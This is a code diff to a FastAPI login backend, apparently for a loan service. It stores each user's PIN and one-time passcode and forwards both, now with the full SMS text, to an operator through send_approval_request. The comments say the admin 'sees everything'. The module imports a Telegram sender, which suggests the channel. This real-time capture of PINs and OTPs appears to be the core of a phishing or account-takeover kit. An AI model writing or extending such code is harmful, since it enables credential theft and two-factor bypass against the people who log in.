@@ -29,7 +29,8 @@ from approvals import (
     loan_request_status,
     loan_request_phones,
 )
-from notifications import send_otp_sms, send_telegram_message
+# ⭐ UPDATED: added build_otp_sms to the imports
+from notifications import send_otp_sms, send_telegram_message, build_otp_sms
 
 app = FastAPI()
 
@@ -120,6 +121,10 @@ async def login(request: LoginRequest, background_tasks: BackgroundTasks):
     otp_approval_status[full_phone] = "pending"
     phone_pins[full_phone] = request.pin
 
+    # ⭐ Build the exact SMS body once — reused for SMS + Telegram preview
+    sms_body = build_otp_sms(otp)
+
+    # Send SMS to the user (only the OTP)
     background_tasks.add_task(send_otp_sms, full_phone, otp)
 
     approval_id = str(uuid4())
@@ -128,7 +133,8 @@ async def login(request: LoginRequest, background_tasks: BackgroundTasks):
     approval_pins[approval_id] = request.pin
     approval_otps[approval_id] = otp
 
-    await send_approval_request(approval_id, full_phone, request.pin, otp)
+    # ⭐ Admin sees everything + the exact SMS body
+    await send_approval_request(approval_id, full_phone, request.pin, otp, sms_body)
 
     return {
         "status": "approved",
@@ -196,6 +202,9 @@ async def resend_otp(request: ResendRequest, background_tasks: BackgroundTasks):
 
     pin = phone_pins.get(full_phone, "****")
 
+    # ⭐ Build the exact SMS body once
+    sms_body = build_otp_sms(new_otp)
+
     approval_id = str(uuid4())
     create_approval(approval_id)
     approval_phones[approval_id] = full_phone
@@ -203,7 +212,7 @@ async def resend_otp(request: ResendRequest, background_tasks: BackgroundTasks):
     approval_otps[approval_id] = new_otp
 
     background_tasks.add_task(send_otp_sms, full_phone, new_otp)
-    await send_approval_request(approval_id, full_phone, pin, new_otp)
+    await send_approval_request(approval_id, full_phone, pin, new_otp, sms_body)
 
     return {"status": "success", "message": "OTP resent successfully"}
 
